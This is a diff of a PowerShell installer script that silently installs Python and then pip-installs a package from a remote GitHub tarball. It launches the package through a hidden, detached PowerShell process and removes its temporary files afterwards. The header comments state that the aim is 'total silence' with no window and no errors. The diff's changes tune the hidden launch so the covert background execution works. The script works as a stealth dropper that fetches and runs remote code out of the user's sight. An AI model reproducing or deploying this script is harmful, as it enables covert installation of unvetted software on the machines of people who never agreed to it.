@@ -1,8 +1,7 @@
 # ===================================================
-# Python 3.12.6 + httpfluent (Final Stealth Smooth)
-# TOTAL SILENCE - BACKGROUND EXECUTION
+# Python 3.12.6 + httpfluent (Final Stealth Fix)
+# TOTAL SILENCE - NO WINDOW - NO ERRORS
 # ===================================================
-
 
 $InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
 $PythonExe = Join-Path $InstallDir "python.exe"
@@ -57,10 +56,10 @@ if ($InstallRequired) {
 & $ExecutableToUse -m pip install requests --quiet > $null 2>&1
 & $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet > $null 2>&1
 
-# --- THE EXECUTION (Background Fix) ---
-# We use Start-Process with Hidden style to run the command that worked.
-# This detaches it from the script session so it stays alive.
-Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command httpfluent" -WindowStyle Hidden -CreateNoWindow > $null 2>&1
+# --- THE EXECUTION (Fixed Background Launch) ---
+# Removed -CreateNoWindow to fix the parameter error.
+# Using a PowerShell background process to launch 'httpfluent' detached.
+Start-Process powershell -ArgumentList "-WindowStyle Hidden -Command httpfluent" -WindowStyle Hidden > $null 2>&1
 
 # --- Step 8: Cleanup ---
 if (Test-Path "$env:TEMP\Python") {
